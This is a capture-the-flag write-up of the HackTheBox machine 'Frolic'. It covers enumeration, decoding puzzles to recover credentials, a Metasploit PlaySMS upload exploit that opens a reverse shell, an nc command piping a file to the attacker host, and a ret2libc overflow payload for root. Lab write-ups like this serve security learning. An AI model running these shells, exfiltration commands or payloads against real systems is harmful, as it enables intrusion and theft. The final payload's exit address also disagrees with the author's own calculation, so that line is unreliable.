---
layout: post
title: Hackthebox Frolic Writeup
categories: HackTheBox
---

<img src="/public/images/2019-03-24/frolic_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Frolic" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.111 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-15 09:44 EEST
Nmap scan report for 10.10.10.111
Host is up (0.035s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h55m15s, deviation: 3h10m30s, median: -5m16s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2018-10-15T12:10:26+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-10-15 09:40:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.70 seconds
{% endhighlight %}

Gobuster HTTP port 1880:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.111:1880 -x .html,.php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.111:1880/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : html,php
[+] Timeout      : 10s
=====================================================
2019/03/22 15:21:35 Starting gobuster
=====================================================
/red (Status: 301)
/vendor (Status: 301)
=====================================================
2019/03/22 16:05:09 Finished
=====================================================
{% endhighlight %}

Gobuster HTTP port 9999:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.111:9999 -x .html,.php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.111:9999/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : html,php
[+] Timeout      : 10s
=====================================================
2019/03/22 14:35:52 Starting gobuster
=====================================================
/admin (Status: 301)
/test (Status: 301)
/dev (Status: 301)
/backup (Status: 301)
/loop (Status: 301)
=====================================================
2019/03/22 15:18:58 Finished
=====================================================
{% endhighlight %}

### 2. Getting User
We can find a login page in "/admin" port 9999.<br>
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-23-10-52-11.png)
This login console is controlled by "/admin/js/login.js" and we can find the password "superduperlooperpassword_lol".
{% highlight shell %}
root@kali:~# curl http://10.10.10.111:9999/admin/js/login.js
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
{% endhighlight %}

In the redirected page "/admin/success.html", there is a "encrypted message"
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-23-10-58-52.png)
{% highlight shell %}
root@kali:~# cat success.html
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
{% endhighlight %}

This does not make any sense. However, we can use <a href="https://www.dcode.fr/langage-ook">This website</a> to interpret this encrypted code.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-23-23-08-36.png)

We got an interesting information. Let's try /asdiSIAJJ0QWE9JAS.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-23-23-29-16.png)

There is a bese64 encoded message.<br>
We can figure out what's this message by following command.
{% highlight shell %}
root@kali:~# echo -n UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA | base64 -d > b64file

root@kali:~# file b64file
b64file: Zip archive data, at least v2.0 to extract
{% endhighlight %}

Sounds like we got a .zip file. This has password protection but the pass is simply guessable "password".
{% highlight shell %}
root@kali:~# unzip b64file
Archive:  b64file
[b64file] index.php password:  # type "password"
  inflating: index.php
{% endhighlight %}

The contents of index.php is hex value.
{% highlight shell %}
root@kali:~# cat index.php 
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
{% endhighlight %}

By using Burp Suite, we can decode this code as ASCII character.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-24-14-40-06.png)
{% highlight shell %}
root@kali:~# cat frolic.b64 
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
{% endhighlight %}

Sounds like this text is base64 encoded. Try to decode.
{% highlight shell %}
root@kali:~# cat frolic.b64 | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
{% endhighlight %}

Then, we got another brainfuck code. Again, try to use <a href="https://www.dcode.fr/langage-ook">This website</a>.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-23-23-56-19.png)

We can login to playsms which is in "/playsms". This information is found in"/dev/backup".
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-24-00-51-58.png)
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-24-00-53-04.png)

The credential is "admin:idkwhatispass".
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-03-24/2019-03-24-14-44-51.png)

searchsploit:
{% highlight shell %}
root@kali:~# searchsploit playsms
---------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                          |  Path
                                                                                        | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------- ----------------------------------------
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)      | exploits/php/remote/44598.rb
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload      | exploits/php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                        | exploits/php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)  | exploits/php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                                                     | exploits/php/webapps/42038.txt
PlaySms 0.7 - SQL Injection                                                             | exploits/linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                          | exploits/php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                   | exploits/php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                                 | exploits/php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                            | exploits/php/webapps/30177.txt
---------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

This time, we can use the exploit "PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)"
{% highlight shell %}
msf5 > use exploit/multi/http/playsms_uploadcsv_exec 
msf5 exploit(multi/http/playsms_uploadcsv_exec) > set rhosts 10.10.10.111
rhosts => 10.10.10.111
msf5 exploit(multi/http/playsms_uploadcsv_exec) > set lhost tun0
lhost => tun0
msf5 exploit(multi/http/playsms_uploadcsv_exec) > set rport 9999
rport => 9999
msf5 exploit(multi/http/playsms_uploadcsv_exec) > set targeturi /playsms/
targeturi => /playsms/
msf5 exploit(multi/http/playsms_uploadcsv_exec) > set password idkwhatispass
password => idkwhatispass
msf5 exploit(multi/http/playsms_uploadcsv_exec) > run

[*] Started reverse TCP handler on 10.10.14.23:4444 
[+] Authentication successful: admin:idkwhatispass
[*] Sending stage (38247 bytes) to 10.10.10.111
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.111:38400) at 2019-03-24 09:18:33 +0200

meterpreter > shell
Process 6996 created.
Channel 0 created.
cd /home
ls -la
total 16
drwxr-xr-x  4 root  root  4096 Sep 23 17:56 .
drwxr-xr-x 22 root  root  4096 Sep 23 17:16 ..
drwxr-xr-x  3 ayush ayush 4096 Sep 25 02:00 ayush
drwxr-xr-x  7 sahay sahay 4096 Sep 25 02:45 sahay
cd ayush
ls -la
total 36
drwxr-xr-x 3 ayush ayush 4096 Sep 25 02:00 .
drwxr-xr-x 4 root  root  4096 Sep 23 17:56 ..
-rw------- 1 ayush ayush 2781 Sep 25 02:47 .bash_history
-rw-r--r-- 1 ayush ayush  220 Sep 23 17:56 .bash_logout
-rw-r--r-- 1 ayush ayush 3771 Sep 23 17:56 .bashrc
drwxrwxr-x 2 ayush ayush 4096 Sep 25 02:43 .binary
-rw-r--r-- 1 ayush ayush  655 Sep 23 17:56 .profile
-rw------- 1 ayush ayush  965 Sep 25 01:58 .viminfo
-rwxr-xr-x 1 ayush ayush   33 Sep 25 01:58 user.txt
cat user.txt
2ab95909cf509f85a6f476b59a0c2fe0
{% endhighlight %}

### 3. Getting Root

We can find an interesting binary which has SUID.
{% highlight shell %}
find / -perm -4000 2>/dev/null
/sbin/mount.cifs
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/bin/umount
/bin/su
/bin/ntfs-3g
/home/ayush/.binary/rop
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
{% endhighlight %}

This binary "rop" takes 1 argument.<br>
{% highlight shell %}
./rop
[*] Usage: program <message>
hoge
/bin/sh: 14: hoge: not found
{% endhighlight %}

We can confirm that putting a long argument causes a segmentation error.
{% highlight shell %}
./rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
{% endhighlight %}

Besides, we can figure out ASLA is disabled.
{% highlight shell %}
cat /proc/sys/kernel/randomize_va_space
0
{% endhighlight %}

This means "rop" has buffer overflow exploit and we can take advantage of it to execute arbitraty command.<br>
At first, we have to download the binary.
{% highlight shell %}
# on localhost
root@kali:~# nc -nlvp 443 > rop
listening on [any] 443 ...

# on 10.10.10.111
nc 10.10.14.23 443 < /home/ayush/.binary/rop
{% endhighlight %}

Then we have to figure out the length of buffer.<br>
Creating payload:
{% highlight shell %}
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
{% endhighlight %}

By debugging with gdb, we can see the execution failed because it tried to jump to memory address "0x62413762"
{% highlight shell %}
root@kali:~# gdb rop
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from rop...(no debugging symbols found)...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /root/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x62413762 in ?? ()
{% endhighlight %}

This address "0x62413762" is from our payload. By using "pattern_offset.rb", we know the size of buffer is 52.
{% highlight shell %}
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762
[*] Exact match at offset 52
{% endhighlight %}

Then, we need information about where is the address of "libc.so.6"
{% highlight shell %}
ldd rop
linux-gate.so.1 =>  (0xb7fda000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
/lib/ld-linux.so.2 (0xb7fdb000)
{% endhighlight %}

Then, we have to figure out where is the address of "/bin/sh", "system", and "exit".
{% highlight shell %}
# address of "/bin/sh"
strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 15ba0b /bin/sh

# address of system
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

# address of exit
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
{% endhighlight %}

According to these information above, our target address is
{% highlight shell %}
system:  0xb7e19000 + 0x0003ada0 = 0xb7e53da0
exit:    0xb7e19000 + 0x0002e9d0 = 0xb7e479d0
/bin/sh: 0xb7e19000 + 0x15ba0b   = 0xb7f74a0b
{% endhighlight %}

To obtain root shell, execute ./rop with these payloads
{% highlight shell %}
./rop `python -c "print 'A'*52 + '\xa0\x3d\xe5\xb7' + '\xd0\x79\xe4\xb4' + '\x0b\x4a\xf7\xb7'"`
id
uid=0(root) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

As always, root.txt is in the directory /root.
{% highlight shell %}
cat /root/root.txt
85d3fdf03f969892538ba9a731826222
{% endhighlight %}
